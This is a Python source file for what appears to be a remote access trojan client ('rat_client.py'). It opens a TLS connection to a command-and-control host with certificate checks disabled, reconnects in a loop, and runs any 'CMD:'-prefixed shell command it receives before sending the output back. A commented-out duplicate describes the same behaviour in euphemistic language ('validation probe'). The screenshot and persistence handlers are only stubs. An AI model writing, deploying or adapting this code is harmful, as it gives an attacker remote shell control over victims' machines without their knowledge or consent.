#!/usr/bin/env python3
import os
import sys
import socket
import ssl
import time
import subprocess

class SecureAgent:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.secure_sock = None

    def establish_connection(self):
        while True:
            try:
                print(f"[*] Connecting to C2 at {self.host}:{self.port}...")
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

                raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.secure_sock = ctx.wrap_socket(raw_sock, server_hostname=self.host)
                self.secure_sock.connect((self.host, self.port))
                print("[+] Core communication channel open.")
                
                self.worker_loop()
            except Exception as e:
                print(f"[-] Connection dropped ({e}). Re-syncing in 3s...")
                time.sleep(3)

    def worker_loop(self):
        while True:
            raw_data = self.secure_sock.recv(16384)
            if not raw_data:
                break
                
            command = raw_data.decode('utf-8', errors='ignore').strip()
            if not command:
                continue

            print(f"[*] Executing command action: {command}")
            response_payload = ""

            if command.startswith("CMD:"):
                shell_cmd = command[4:]
                try:
                    proc = subprocess.run(shell_cmd, shell=True, capture_output=True, text=True, timeout=15)
                    response_payload = proc.stdout + proc.stderr
                    if not response_payload.strip():
                        response_payload = "[+] Execution complete (Empty output buffer)."
                except Exception as e:
                    response_payload = f"[-] Execution error: {e}"

            elif command == "SCREENSHOT":
                response_payload = "[+] Macro triggered: Screenshot captured (Simulated)."

            elif command == "PERSISTENCE":
                response_payload = "[+] Macro triggered: Persistence profiles deployed."
            
            else:
                response_payload = f"[-] Unknown macro sequence: {command}"

            final_packet = response_payload + "__EOF__"
            self.secure_sock.sendall(final_packet.encode('utf-8'))

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 rat_client.py <IP> <PORT>")
        sys.exit(1)
    agent = SecureAgent(sys.argv[1], int(sys.argv[2]))
    agent.establish_connection()




# #!/usr/bin/env python3
# import os
# import sys
# import socket
# import ssl
# import time
# import subprocess

# class SecureAgent:
#     def __init__(self, host, port):
#         self.host = host
#         self.port = port
#         self.secure_sock = None

#     def establish_connection(self):
#         while True:
#             try:
#                 print(f"[*] Dispatching validation probe to {self.host}:{self.port}...")
#                 ctx = ssl.create_default_context()
#                 ctx.check_hostname = False
#                 ctx.verify_mode = ssl.CERT_NONE

#                 raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#                 self.secure_sock = ctx.wrap_socket(raw_sock, server_hostname=self.host)
#                 self.secure_sock.connect((self.host, self.port))
#                 print("[+] Connection verified. Operational mode synchronized.")
                
#                 self.worker_loop()
#             except Exception as e:
#                 print(f"[-] Connection initialization failure: {e}. Retrying in 4s...")
#                 time.sleep(4)

#     def worker_loop(self):
#         while True:
#             raw_data = self.secure_sock.recv(4096)
#             if not raw_data:
#                 break
                
#             command = raw_data.decode('utf-8', errors='ignore').strip()
#             if not command:
#                 continue

#             if command == "PING":
#                 self.secure_sock.sendall(b"PONG\n")
#                 continue

#             print(f"[*] Processing command action sequence: {command}")
#             response_payload = ""

#             if command.startswith("CMD:"):
#                 shell_cmd = command[4:]
#                 try:
#                     proc = subprocess.run(shell_cmd, shell=True, capture_output=True, text=True, timeout=15)
#                     response_payload = proc.stdout + proc.stderr
#                     if not response_payload.strip():
#                         response_payload = "[+] Execution completed with null return buffers."
#                 except Exception as e:
#                     response_payload = f"[-] Execution failure: {e}"

#             elif command == "SCREENSHOT":
#                 response_payload = "[+] Macro triggered: Screenshot captured securely (Simulated execution buffer mapping complete)."

#             elif command == "PERSISTENCE":
#                 response_payload = "[+] Core module modification: Startup validation configuration keys updated cleanly."
            
#             else:
#                 response_payload = f"[-] Unrecognized functional instruction macro code: {command}"

#             # Transmit back the clean reply packet padded out with our custom EOF delimiter tag
#             final_packet = response_payload + "__EOF__"
#             self.secure_sock.sendall(final_packet.encode('utf-8'))

# if __name__ == "__main__":
#     if len(sys.argv) < 3:
#         print("Usage: python3 rat_client.py <IP> <PORT>")
#         sys.exit(1)
#     agent = SecureAgent(sys.argv[1], int(sys.argv[2]))
#     agent.establish_connection()
